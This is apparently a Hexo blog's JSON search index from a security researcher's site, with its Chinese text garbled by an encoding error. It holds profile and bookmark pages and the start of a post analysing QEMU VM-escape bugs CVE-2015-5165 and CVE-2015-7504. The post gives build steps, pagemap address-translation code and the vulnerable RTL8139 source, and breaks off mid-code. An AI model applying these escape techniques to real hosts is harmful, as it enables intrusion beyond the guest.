{"meta":{"title":"æ··å…ƒéœ¹é›³æ‰‹","subtitle":"Battleâš”ï¸ 2 the worldğŸŒ","description":"Juice is temporary but Sauce is forever","author":"Cool-Y","url":"https://cool-y.github.io","root":"/"},"pages":[{"title":"","date":"2019-04-15T07:35:38.084Z","updated":"2019-04-15T07:35:38.084Z","comments":true,"path":"baidu_verify_4WtqA1rZRc.html","permalink":"https://cool-y.github.io/baidu_verify_4WtqA1rZRc.html","excerpt":"","text":"4WtqA1rZRc"},{"title":"","date":"2019-04-15T07:35:38.085Z","updated":"2019-04-15T07:35:38.085Z","comments":true,"path":"googleacf4df440b4becc4.html","permalink":"https://cool-y.github.io/googleacf4df440b4becc4.html","excerpt":"","text":"google-site-verification: googleacf4df440b4becc4.html"},{"title":"About Coolâ„ï¸, aka æ··å…ƒéœ¹é›³æ‰‹","date":"2019-03-17T10:55:11.000Z","updated":"2021-04-10T20:07:53.323Z","comments":false,"path":"about/index.html","permalink":"https://cool-y.github.io/about/index.html","excerpt":"","text":"TL;DR ğŸ”­ Iâ€™m currently focus on IoT security and Android security. ğŸŒ± Iâ€™m currently learning VM escape. ğŸ“ My blog: https://cool-y.github.io/ ğŸ« Bachelor: Sichuan university; Master: Wuhan university ğŸ“« Hit me up: cool.yim@foxmail.com âš¡ Fun fact: â€˜Fun Factsâ€™ Are Never Fun ğŸ’¬ Ask me about â€¦ ğŸ™ŠPapersæ™ºèƒ½å®¶å±…æ”»å‡»ä¸é˜²å¾¡æ–¹æ³•ç»¼è¿°ä¿¡æ¯å®‰å…¨å­¦æŠ¥ , Han Yan, Guojun Peng, Luo Yuan, Side Liu Android Data-Clone Attack via Operating System CustomizationIEEE Access, Song, Wenna, Ming Jiang, Han Yan, Yi Xiang, Yuan Chen, Yuan Luo, Kun He, and Guojun Peng. Appâ€™s Auto-Login Function Security Testing via Android OS-Level VirtualizationICSEâ€™21, Song, Wenna, Jiang Ming, Lin Jiang, Han Yan, Yi Xiang, Yuan Chen, Jianming Fu, and Guojun Peng. ğŸ™ˆAcademic serviceJournal Sub Reviewerï¼š ä¿¡æ¯å®‰å…¨å­¦æŠ¥ï¼ŒCyber Security ğŸ’Vulnerabilities Disclosure PSV-2018-0020(duplicate) PSV-2019-0164 CVE-2019-15843 PSV-2020-0211(extended) CVE-2020-15893(extended)"},{"title":"","date":"2019-03-28T05:39:07.000Z","updated":"2019-07-01T12:29:27.676Z","comments":false,"path":"bookmarks/index.html","permalink":"https://cool-y.github.io/bookmarks/index.html","excerpt":"","text":"å°†å¸¸ç”¨çš„ä¸€äº›ç½‘ç«™æ±‡æ€»åœ¨æ­¤ï¼Œä¾¿äºæµè§ˆå’ŒæŸ¥è¯¢ å®‰å…¨åšå®¢ 360æ ¸å¿ƒå®‰å…¨æŠ€æœ¯åšå®¢ &nbsp;phrake &nbsp; Sec-WIKI &nbsp; ç»¿ç›Ÿç§‘æŠ€ è®ºå› çœ‹é›ª &nbsp;Paper&nbsp; XDA&nbsp; FreeBuf&nbsp; å®‰å…¨å®¢&nbsp; å¾çˆ±ç ´è§£&nbsp; å¾çˆ±æ¼æ´&nbsp; æ¼æ´é“¶è¡Œexploit-db CTF CTFé¢†åŸŸæŒ‡å—&nbsp; pwnhub&nbsp; ä¹Œäº‘çŸ¥è¯†åº“&nbsp; ctfç»´åŸº&nbsp; pwnå°æ¹¾&nbsp; pwnéŸ©å›½ æŠ€èƒ½å­¦ä¹  æ€å¦ iot æ™ºèƒ½å®¶å±…ç™¾ç§‘&nbsp; HomeAssistant&nbsp; HomeBridge ç¼–ç¨‹ codeforces&nbsp; leetcode å·¥å…· mitmproxy&nbsp; msfvenom&nbsp; shellphish&nbsp; KALItools&nbsp;valgrind-å†…å­˜æ³„éœ²æ‰«æåˆ©å™¨ èµ„æºä¸‹è½½ Emojiè¡¨æƒ…&nbsp; Apké•œåƒ æœåŠ¡æä¾› äº‘å›¾ç‰‡å­˜å‚¨&nbsp; shodan"},{"title":"æ–‡ç« åˆ†ç±»","date":"2019-03-16T09:42:42.000Z","updated":"2019-04-15T07:35:38.085Z","comments":false,"path":"categories/index.html","permalink":"https://cool-y.github.io/categories/index.html","excerpt":"","text":""},{"title":"æ–‡ç« æ ‡ç­¾","date":"2019-03-16T09:37:34.000Z","updated":"2019-04-15T07:35:38.085Z","comments":false,"path":"tags/index.html","permalink":"https://cool-y.github.io/tags/index.html","excerpt":"","text":""},{"title":"Life is a wonderful thing","date":"2019-08-08T12:35:31.000Z","updated":"2021-04-10T18:21:15.583Z","comments":true,"path":"hackä¹‹å¤–/index.html","permalink":"https://cool-y.github.io/hackä¹‹å¤–/index.html","excerpt":"","text":"ğŸ‘£FootprintBeijing Qingdao &amp; Yantai Hangzhou Nanjing Shanghai Quanzhou &amp; Xiamen Haikou Qinghai Xian Chengdu Wuhan Kangding Zhengzhou Changsha Shenzhen Xinjiang Zhuhai Xizang Guangzhou Hulunbeier"}],"posts":[{"title":"VM escape-QEMU Case Study","slug":"vm-escape1","date":"2021-04-10T10:25:46.000Z","updated":"2021-04-10T13:33:14.007Z","comments":true,"path":"2021/04/10/vm-escape1/","link":"","permalink":"https://cool-y.github.io/2021/04/10/vm-escape1/","excerpt":"","text":"1 Introå¦‚ä»Šï¼Œè™šæ‹Ÿæœºå·²å¤§é‡éƒ¨ç½²ä»¥ä¾›ä¸ªäººä½¿ç”¨æˆ–åœ¨ä¼ä¸šç»†åˆ†å¸‚åœºä¸­ä½¿ç”¨ã€‚ ç½‘ç»œå®‰å…¨ä¾›åº”å•†ä½¿ç”¨ä¸åŒçš„VMåœ¨å—æ§å’Œå—é™çš„ç¯å¢ƒä¸­åˆ†ææ¶æ„è½¯ä»¶ã€‚ ä¸€ä¸ªè‡ªç„¶çš„é—®é¢˜å‡ºç°äº†ï¼šæ¶æ„è½¯ä»¶èƒ½å¦ä»è™šæ‹Ÿæœºä¸­é€ƒè„±å¹¶åœ¨ä¸»æœºä¸Šæ‰§è¡Œä»£ç ï¼Ÿ 2015å¹´ï¼Œæ¥è‡ªCrowdStrikeçš„Jason GeffneræŠ¥å‘Šäº†QEMUä¸­çš„ä¸€ä¸ªä¸¥é‡é”™è¯¯ï¼ˆCVE-2015-3456ï¼‰ï¼Œè¯¥é”™è¯¯å½±å“äº†è™šæ‹Ÿè½¯ç›˜é©±åŠ¨å™¨ä»£ç ï¼Œè¿™å¯èƒ½ä½¿æ”»å‡»è€…ä»VMé€ƒè„±åˆ°ä¸»æœºã€‚ æ­¤æ¼æ´åœ¨netsecç¤¾åŒºä¸­å¼•èµ·äº†æå¤§çš„å…³æ³¨ï¼Œå¯èƒ½æ˜¯å› ä¸ºå®ƒæœ‰ä¸€ä¸ªä¸“ç”¨åï¼ˆVENOMï¼‰ï¼Œè¿™å¹¶ä¸æ˜¯ç¬¬ä¸€ä¸ªæ­¤ç±»æ¼æ´ã€‚ 2011å¹´ï¼ŒNelson Elhageåœ¨Blackhat æŠ¥å‘Šå¹¶æˆåŠŸåˆ©ç”¨äº†QEMUæ¨¡æ‹ŸPCIè®¾å¤‡çƒ­æ’æ‹”ä¸­çš„æ¼æ´ã€‚ 2016å¹´ï¼Œæ¥è‡ªå¥‡è™360çš„åˆ˜æ—­å’Œç‹èƒœå¹³åœ¨HITB 2016ä¸Šå±•ç¤ºäº†å¯¹KVM / QEMUçš„æˆåŠŸåˆ©ç”¨ã€‚ ä»–ä»¬åˆ©ç”¨äº†ä¸¤ä¸ªä¸åŒçš„ç½‘å¡è®¾å¤‡ä»¿çœŸå™¨æ¨¡å‹RTL8139å’ŒPCNETä¸­å­˜åœ¨çš„ä¸¤ä¸ªæ¼æ´ï¼ˆCVE-2015-5165å’ŒCVE-2015-7504ï¼‰ã€‚ åœ¨ä»–ä»¬çš„æ¼”è®²ä¸­ï¼Œä»–ä»¬æ¦‚è¿°äº†åœ¨ä¸»æœºä¸Šæ‰§è¡Œä»£ç çš„ä¸»è¦æ­¥éª¤ï¼Œä½†æ²¡æœ‰æä¾›ä»»ä½•åˆ©ç”¨ï¼Œä¹Ÿæ²¡æœ‰æä¾›å†ç°å®ƒçš„æŠ€æœ¯ç»†èŠ‚ã€‚ åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æä¾›äº†å¯¹CVE-2015-5165ï¼ˆä¸€ä¸ªå†…å­˜æ³„æ¼æ¼æ´ï¼‰å’ŒCVE-2015-7504ï¼ˆä¸€ä¸ªåŸºäºå †çš„æº¢å‡ºæ¼æ´ï¼‰çš„æ·±å…¥åˆ†æï¼Œä»¥åŠå¯åˆ©ç”¨çš„æ¼æ´ã€‚ è¿™ä¸¤ä¸ªæ¼æ´çš„ç»“åˆå¯è®©æ‚¨ä»VMçªå›´å¹¶åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä»£ç ã€‚ æˆ‘ä»¬è®¨è®ºäº†æŠ€æœ¯ç»†èŠ‚ï¼Œä»¥åˆ©ç”¨QEMUçš„ç½‘å¡è®¾å¤‡ä»¿çœŸä¸­çš„æ¼æ´ï¼Œå¹¶æä¾›å¯ä»¥é‡æ–°ä½¿ç”¨ä»¥åˆ©ç”¨QEMUæœªæ¥é”™è¯¯çš„é€šç”¨æŠ€æœ¯ã€‚ ä¾‹å¦‚ï¼Œåˆ©ç”¨å…±äº«å†…å­˜åŒºåŸŸå’Œå…±äº«ä»£ç çš„äº¤äº’å¼ç»‘å®šå¤–å£³ã€‚ 2 KVM/QEMU OverviewKVMï¼ˆKernal-based Virtual Machineï¼ŒåŸºäºå†…æ ¸çš„è™šæ‹Ÿæœºï¼‰æ˜¯ä¸€ä¸ªå†…æ ¸æ¨¡å—ï¼Œå¯ä¸ºç”¨æˆ·ç©ºé—´ç¨‹åºæä¾›å®Œæ•´çš„è™šæ‹ŸåŒ–åŸºç¡€æ¶æ„ã€‚ å®ƒå…è®¸ä¸€ä¸ªäººè¿è¡Œå¤šä¸ªè¿è¡Œæœªä¿®æ”¹çš„Linuxæˆ–Windowsæ˜ åƒçš„è™šæ‹Ÿæœºã€‚ KVMçš„ç”¨æˆ·ç©ºé—´ç»„ä»¶åŒ…å«åœ¨ä¸»çº¿QEMUï¼ˆå¿«é€Ÿä»¿çœŸå™¨ï¼‰ä¸­ï¼Œè¯¥QEMUç‰¹åˆ«å¤„ç†è®¾å¤‡ä»¿çœŸã€‚ 2.1 Workspace Environmentä¸ºäº†ä½¿é‚£äº›æƒ³ä½¿ç”¨æœ¬æ–‡ä¸­ç»™å‡ºçš„ç¤ºä¾‹ä»£ç çš„äººæ›´è½»æ¾ï¼Œæˆ‘ä»¬åœ¨æ­¤å¤„æä¾›äº†é‡ç°æˆ‘ä»¬çš„å¼€å‘ç¯å¢ƒçš„ä¸»è¦æ­¥éª¤ã€‚ ç”±äºæˆ‘ä»¬å®šä½çš„æ¼æ´å·²ç»ä¿®å¤ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç­¾å‡ºQEMUå­˜å‚¨åº“çš„æºï¼Œå¹¶åˆ‡æ¢åˆ°è¿™äº›æ¼æ´çš„ä¿®å¤ä¹‹å‰çš„æäº¤ã€‚ ç„¶åï¼Œæˆ‘ä»¬ä»…ä¸ºç›®æ ‡x86_64é…ç½®QEMUå¹¶å¯ç”¨è°ƒè¯•ï¼Œåœ¨æˆ‘ä»¬çš„æµ‹è¯•ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨Gccçš„4.9.2ç‰ˆæ„å»ºQEMUï¼š 1234567$ git clone git://git.qemu-project.org/qemu.git$$ git checkout bd80b59$ mkdir -p bin/debug/native$ cd bin/debug/native$ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror$ make ä½¿ç”¨qemu-imgæ¥ç”Ÿæˆä¸€ä¸ªqcow2ç³»ç»Ÿæ–‡ä»¶ 12**`$`**` ./qemu-img create -f qcow2 ubuntu.qcow2 20G`$ sudo chmod 666 /dev/kvm ä¹‹åé¦–å…ˆé€šè¿‡qemu-system-x86_64å®Œæˆå¯¹qcow2ç³»ç»Ÿæ–‡ä»¶ä¸­ç³»ç»Ÿçš„å®‰è£…ï¼Œéœ€è¦ç”¨-cdromå¯¹isoé•œåƒæ–‡ä»¶è¿›è¡ŒåŠ è½½ 12$ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -hda ./ubuntu.qcow2 -cdrom\\ &apos;/home/han/VMescape/ubuntu-16.04-server-amd64.iso&apos; å®‰è£…å®Œæˆåå°±è·å¾—äº†ä¸€ä¸ªæœ‰ç³»ç»Ÿçš„qcow2æ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ†é…2GBçš„å†…å­˜å¹¶åˆ›å»ºä¸¤ä¸ªç½‘ç»œæ¥å£å¡ï¼šRTL8139å’ŒPCNETï¼ŒåŒæ—¶åˆ›å»ºtapæ¥å£è¿æ¥è™šæ‹Ÿæœºå’Œä¸»æœºï¼š 12345678âœ— sudo tunctl -t tap0 -u `whoami`âœ— sudo ifconfig tap0 192.168.2.1/24$ ./x86_64-softmmu/qemu-system-x86_64 -enable-kvm -m 2048 -display vnc=:89 \\-netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 -netdev user,id=t1, \\-device pcnet,netdev=t1,id=nic1 -drive \\file=/home/han/VMescape/qemu/bin/debug/native/ubuntu.qcow2,\\format=qcow2,if=ide,cache=writeback,\\-net nic -net tap,ifname=tap0,script=no,downscript=no ä½¿ç”¨vncviewerè¿æ¥qemu 12`apt-get install xvnc4viewer`vncviewer 127.0.0.1:5989 2.2 QEMU Memory Layoutåˆ†é…ç»™guestè™šæ‹Ÿæœºçš„ç‰©ç†å†…å­˜å®é™…ä¸Šæ˜¯QEMUè™šæ‹Ÿåœ°å€ç©ºé—´ä¸­mmappä¸“ç”¨çš„åŒºåŸŸã€‚ é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œåˆ†é…guestçš„ç‰©ç†å†…å­˜æ—¶æœªå¯ç”¨PROT_EXECæ ‡å¿—ã€‚ ä¸‹å›¾è¯´æ˜äº†æ¥å®¾çš„å†…å­˜å’Œä¸»æœºçš„å†…å­˜å¦‚ä½•å…±å­˜ã€‚ 12345678910111213141516171819202122232425 Guest&apos; processes +--------------------+Virtual addr space | | +--------------------+ | | **\\__ Page Table \\__ \\ \\** | | Guest kernel +----+--------------------+----------------+Guest&apos;s phy. memory | | | | +----+--------------------+----------------+ | | **\\__ \\__ \\ \\** | QEMU process | +----+------------------------------------------+Virtual addr space | | | +----+------------------------------------------+ | | \\__ Page Table \\__ \\ \\ | | +----+-----------------------------------------------++Physical memory | | || +----+-----------------------------------------------++ æ­¤å¤–ï¼ŒQEMUä¸ºBIOSå’ŒROMä¿ç•™äº†ä¸€ä¸ªå†…å­˜åŒºåŸŸã€‚ è¿™äº›æ˜ å°„åœ¨QEMUæ˜ å°„æ–‡ä»¶ä¸­å¯ç”¨ï¼š 123456789101112131415161718192021âœ— cat /proc/36220/maps555aae05c000-555aae931000 r-xp 00000000 08:01 2239549 /usr/bin/qemu-system-x86_64555aaeb30000-555aaecfc000 r--p 008d4000 08:01 2239549 /usr/bin/qemu-system-x86_64555aaecfc000-555aaed7b000 rw-p 00aa0000 08:01 2239549 /usr/bin/qemu-system-x86_64555aaed7b000-555aaf1de000 rw-p 00000000 00:00 0555ab0c1c000-555ab2015000 rw-p 00000000 00:00 0 [heap]7f90b2e2b000-7f90b2e38000 r-xp 00000000 08:01 2758598 /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.257f90b2e38000-7f90b3037000 ---p 0000d000 08:01 2758598 /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.257f90b3037000-7f90b3038000 r--p 0000c000 08:01 2758598 /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.257f90b3038000-7f90b3039000 rw-p 0000d000 08:01 2758598 /usr/lib/x86_64-linux-gnu/sasl2/libdigestmd5.so.2.0.25 .... [other shared libs]7f9152f96000-7f9152f99000 rw-s 00000000 00:0e 12527 anon_inode:kvm-vcpu:07f9152f99000-7f9152f9a000 r--p 00029000 08:01 2374490 /lib/x86_64-linux-gnu/ld-2.27.so7f9152f9a000-7f9152f9b000 rw-p 0002a000 08:01 2374490 /lib/x86_64-linux-gnu/ld-2.27.so7f9152f9b000-7f9152f9c000 rw-p 00000000 00:00 07ffe2cf63000-7ffe2cf84000 rw-p 00000000 00:00 0 [stack]7ffe2cf8f000-7ffe2cf92000 r--p 00000000 00:00 0 [vvar]7ffe2cf92000-7ffe2cf93000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] æœ‰å…³è™šæ‹ŸåŒ–ç¯å¢ƒä¸­å†…å­˜ç®¡ç†çš„æ›´è¯¦ç»†è¯´æ˜ï¼Œè¯·å‚è§ï¼šhttp://lettieri.iet.unipi.it/virtualization/2014/Vtx.pdf 2.3 Address Translationåœ¨QEMUä¸­å­˜åœ¨ä¸¤ä¸ªç¿»è¯‘å±‚ï¼šGuest Virtual Address â†’ Guest Physical Address â†’ Host Virtual Address ä»Guestè™šæ‹Ÿåœ°å€åˆ°Guestç‰©ç†åœ°å€ã€‚ åœ¨æˆ‘ä»¬çš„åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é…ç½®éœ€è¦DMAè®¿é—®çš„ç½‘å¡è®¾å¤‡ã€‚ ä¾‹å¦‚ï¼Œæˆ‘ä»¬éœ€è¦æä¾›Tx / Rxç¼“å†²åŒºçš„ç‰©ç†åœ°å€ä»¥æ­£ç¡®é…ç½®ç½‘å¡è®¾å¤‡ã€‚ ä»Guestç‰©ç†åœ°å€åˆ°QEMUçš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ åœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å…¥ä¼ªé€ çš„ç»“æ„ï¼Œå¹¶åœ¨QEMUçš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­è·å¾—å…¶ç²¾ç¡®åœ°å€ã€‚ åœ¨x64ç³»ç»Ÿä¸Šï¼Œè™šæ‹Ÿåœ°å€ç”±é¡µåç§»é‡ï¼ˆä½0-11ï¼‰å’Œé¡µç ç»„æˆã€‚ åœ¨linuxç³»ç»Ÿä¸Šï¼Œå…·æœ‰CAP_SYS_ADMINç‰¹æƒçš„ç”¨æˆ·ç©ºé—´è¿›ç¨‹èƒ½å¤Ÿä½¿ç”¨é¡µé¢æ˜ å°„æ–‡ä»¶ï¼ˆpagemap ï¼‰æ‰¾å‡ºè™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€çš„æ˜ å°„ã€‚ é¡µé¢æ˜ å°„æ–‡ä»¶ä¸ºæ¯ä¸ªè™šæ‹Ÿé¡µé¢å­˜å‚¨ä¸€ä¸ª64ä½å€¼ï¼Œå…¶ä¸­physical_address = PFN * page_size + offset 1234567**- Bits 0-54 : physical frame number if present.**- Bit 55 : page table entry is soft-dirty.- Bit 56 : page exclusively mapped.- Bits 57-60 : zero- Bit 61 : page is file-page or shared-anon.- Bit 62 : page is swapped.- Bit 63 : page is present. å°†è™šæ‹Ÿåœ°å€ï¼ˆGuest Virtual Addressï¼‰è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼ˆGuest Physical Addressï¼‰çš„è¿‡ç¨‹åŒ…æ‹¬ 64weiæ¯ä¸ªé¡µé¢çš„å¤§å°ä¸º 4096 å­—èŠ‚ï¼Œå³ 1 &lt;&lt; 12 ï¼› åŸºäº /proc/pid/pagemap å¯ä»¥æŸ¥çœ‹è¿›ç¨‹ä»»æ„ Virtual Page çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬æ˜¯å¦è¢«æ˜ å°„åˆ°ç‰©ç†å†…å­˜ä»¥åŠåœ¨ç‰©ç†å†…å­˜ä¸­çš„ Page Frame Numberï¼ˆPFNï¼‰ç­‰ï¼› pagemap æ–‡ä»¶ä¸ºæ¯ä¸ª Virtual Page å­˜å‚¨ 64 ä½ï¼ˆå³ 8 å­—èŠ‚ï¼‰çš„ä¿¡æ¯ï¼Œæ•°æ®æ ¼å¼å¦‚ä¸Šã€‚ å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ address ï¼ŒåŸºäº address/4096 å¯ä»¥è®¡ç®—å‡ºè¯¥è™šæ‹Ÿåœ°å€åœ¨ pagemap æ–‡ä»¶ä¸­çš„ç´¢å¼•å€¼ï¼Œ address/4096 * 8 å³å¯¹åº”çš„æ–‡ä»¶åç§»å€¼ï¼Œåœ¨è¯¥ä½ç½®èƒ½å¤Ÿè·å–PFNä¿¡æ¯ï¼› é¡µå†…åç§»å¯¹ä»»æ„çš„è™šæ‹Ÿåœ°å€ address ï¼Œaddress%4096 å³è™šæ‹Ÿåœ°å€åœ¨å¯¹åº”çš„å†…å­˜é¡µä¸­çš„åç§»å€¼ï¼› æ ¹æ®ç‰©ç†å†…å­˜çš„ PFN ï¼ˆphysical frame numberï¼‰ä»¥åŠé¡µå†…åç§»ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºå¯¹åº”çš„ç‰©ç†åœ°å€ï¼› 12`physical_address = PFN * page_size + offsetphyscial_addr ``=`` ``(``page_frame_number ``&lt;&lt;`` PAGE_SHIFT``)`` ``+`` distance_from_page_boundary_of_buffer` æˆ‘ä»¬ä¾é Nelson Elhageçš„ä»£ç ã€‚ ä¸‹é¢çš„ç¨‹åºåˆ†é…ä¸€ä¸ªç¼“å†²åŒºï¼Œå¹¶ç”¨å­—ç¬¦ä¸²â€œWhere am I?â€å¡«å……å®ƒã€‚ å¹¶æ‰“å°å…¶ç‰©ç†åœ°å€ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162---[ mmu.c ]---#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;uint32_t page_offset(uint32_t addr)&#123; return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); if (!(pme &amp; PFN_PRESENT)) return -1; # The page frame number is in bits 0-54 so read the first 7 bytes and clear the 55th bit gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; uint8_t *ptr; uint64_t ptr_mem; fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); if (fd &lt; 0) &#123; perror(&quot;open&quot;); exit(1); &#125; ptr = malloc(256); strcpy(ptr, &quot;Where am I?&quot;); printf(&quot;%s\\n&quot;, ptr); ptr_mem = gva_to_gpa(ptr); printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\\n&quot;, ptr_mem); getchar(); return 0;&#125; é™æ€ç¼–è¯‘å¥½ç¨‹åºä¹‹åå°†å…¶ä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºä¸­ä»¥ root èº«ä»½æ‰§è¡Œï¼Œæ‰“å°å‡ºç‰©ç†åœ°å€ä¸º 0x73b17b20åœ¨ä¸»æœºå°†gdbé™„åŠ åˆ°QEMUè¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¼“å†²åŒºä½äºä¸ºguestè™šæ‹Ÿæœºåˆ†é…çš„ç‰©ç†åœ°å€ç©ºé—´å†…ã€‚ æ›´å‡†ç¡®åœ°è¯´ï¼Œè¾“å‡ºçš„guestç‰©ç†åœ°å€åœ°å€å®é™…ä¸Šæ˜¯ä¸guestç‰©ç†å†…å­˜åŸºå€çš„åç§»é‡ã€‚ 12345678910111213141516âœ— sudo gdb qemu-system-x86_64 38140(gdb) info proc mappingsprocess 38140Mapped address spaces: Start Addr End Addr Size Offset objfile 0x556857048000 0x55685791d000 0x8d5000 0x0 /usr/bin/qemu-system-x86_64 0x556857b1c000 0x556857ce8000 0x1cc000 0x8d4000 /usr/bin/qemu-system-x86_64 0x556857ce8000 0x556857d67000 0x7f000 0xaa0000 /usr/bin/qemu-system-x86_64 0x556857d67000 0x5568581ca000 0x463000 0x0 0x556859c27000 0x55685b038000 0x1411000 0x0 [heap] ... ... ... ... **0x7f72afe00000** **** **0x7f732fe00000** **** **0x80000000** 0x0 [2GB RAM] ... ... ... ...(gdb) x/s 0x7f72afe00000+0x73b17b200x7f7323917b20: &quot;Where am I?&quot; 3 Memory Leak Exploitationæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨CVE-2015-5165ï¼ˆä¸€ä¸ªä¼šå½±å“RTL8139ç½‘å¡è®¾å¤‡ä»¿çœŸå™¨çš„å†…å­˜æ³„æ¼æ¼æ´ï¼‰æ¥é‡å»ºQEMUçš„å†…å­˜å¸ƒå±€ã€‚ æ›´å‡†ç¡®åœ°è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼ .textæ®µçš„åŸºåœ°å€ï¼Œä»¥æ„å»ºæˆ‘ä»¬çš„shellcode ä¸ºGueståˆ†é…çš„ç‰©ç†å†…å­˜çš„åŸºåœ°å€ï¼Œä»¥ä¾¿èƒ½å¤Ÿè·å¾— ä¸€äº›è™šæ‹Ÿç»“æ„çš„åœ°å€ 3.1 The vulnerable CodeREALTEKç½‘å¡æ”¯æŒä¸¤ç§ æ¥æ”¶/å‘é€ æ“ä½œæ¨¡å¼ï¼šCæ¨¡å¼å’ŒC +æ¨¡å¼ã€‚ å½“å°†ç½‘å¡è®¾ç½®ä¸ºä½¿ç”¨C +æ—¶ï¼Œç½‘å¡è®¾å¤‡ä»¿çœŸå™¨ä¼šé”™è¯¯åœ°è®¡ç®—IPæ•°æ®åŒ…æ•°æ®çš„é•¿åº¦ï¼Œæœ€ç»ˆå‘é€çš„æ•°æ®é‡ä¼šè¶…å‡ºæ•°æ®åŒ…ä¸­å®é™…å¯ç”¨çš„æ•°æ®é‡ã€‚ è¯¥æ¼æ´å­˜åœ¨äºhw/net/rtl8139.cçš„ rtl8139_cplus_transmit_one å‡½æ•°ä¸­ï¼š 12345678910111213141516171819202122232425262728293031/* ip packet header */ip_header *ip = NULL;int hlen = 0;uint8_t ip_protocol = 0;uint16_t ip_data_len = 0;uint8_t *eth_payload_data = NULL;size_t eth_payload_len = 0;int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12));if (proto == ETH_P_IP)&#123; DPRINTF(&quot;+++ C+ mode has IP packet\\n&quot;); /* not aligned */ eth_payload_data = saved_buffer + ETH_HLEN; eth_payload_len = saved_size - ETH_HLEN; ip = (ip_header*)eth_payload_data; if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123; DPRINTF(&quot;+++ C+ mode packet has bad IP version %d &quot; &quot;expected %d\\n&quot;, IP_HEADER_VERSION(ip), IP_HEADER_VERSION_4); ip = NULL; &#125; else &#123; hlen = IP_HEADER_LENGTH(ip); ip_protocol = ip-&gt;ip_p; **ip_data_len** **= be16_to_cpu(ip-&gt;ip_len) - hlen;** &#125;&#125; IPå¤´åŒ…å«ä¸¤ä¸ªå­—æ®µhlenå’Œip-&gt; ip_lenï¼Œåˆ†åˆ«è¡¨ç¤ºIPå¤´çš„é•¿åº¦ï¼ˆè€ƒè™‘åˆ°ä¸å¸¦é€‰é¡¹çš„æ•°æ®åŒ…ï¼Œä¸º20å­—èŠ‚ï¼‰å’ŒåŒ…æ‹¬ipå¤´çš„æ•°æ®åŒ…çš„æ€»é•¿åº¦ã€‚ å¦‚ä¸‹é¢ç»™å‡ºçš„ä»£ç ç‰‡æ®µæœ«å°¾æ‰€ç¤ºï¼Œåœ¨è®¡ç®—IPæ•°æ®é•¿åº¦ï¼ˆip_data_lenï¼‰æ—¶ï¼Œæ²¡æœ‰æ£€æŸ¥ä»¥ç¡®ä¿ ipâ†’ip_len &gt;= hlen ã€‚ ç”±äºip_data_lenå­—æ®µè¢«ç¼–ç ä¸ºunsigned short intï¼Œå› æ­¤å¯¼è‡´å‘é€çš„æ•°æ®å¤šäºå‘é€ç¼“å†²åŒºä¸­å®é™…å¯ç”¨çš„æ•°æ®ã€‚ æ›´ç²¾ç¡®åœ°è®²ï¼Œip_data_lenç¨åç”¨äºè®¡ç®—TCPæ•°æ®çš„é•¿åº¦ï¼Œå¦‚æœè¯¥æ•°æ®è¶…è¿‡MTUçš„å¤§å°ï¼Œåˆ™å°†å…¶é€å—å¤åˆ¶åˆ°ä¸€ä¸ªmallocç¼“å†²åŒºä¸­ï¼š 12345678910111213141516171819202122232425int **tcp_data_len** **= ip_data_len - tcp_hlen;**int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;int is_last_frame = 0;for (tcp_send_offset = 0; tcp_send_offset &lt; tcp_data_len; tcp_send_offset += tcp_chunk_size) &#123; uint16_t chunk_size = tcp_chunk_size; /* check if this is the last frame */ if (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len) &#123; is_last_frame = 1; chunk_size = tcp_data_len - tcp_send_offset; &#125; memcpy(data_to_checksum, saved_ip_header + 12, 8); if (tcp_send_offset) &#123; memcpy((uint8_t*)p_tcp_hdr + 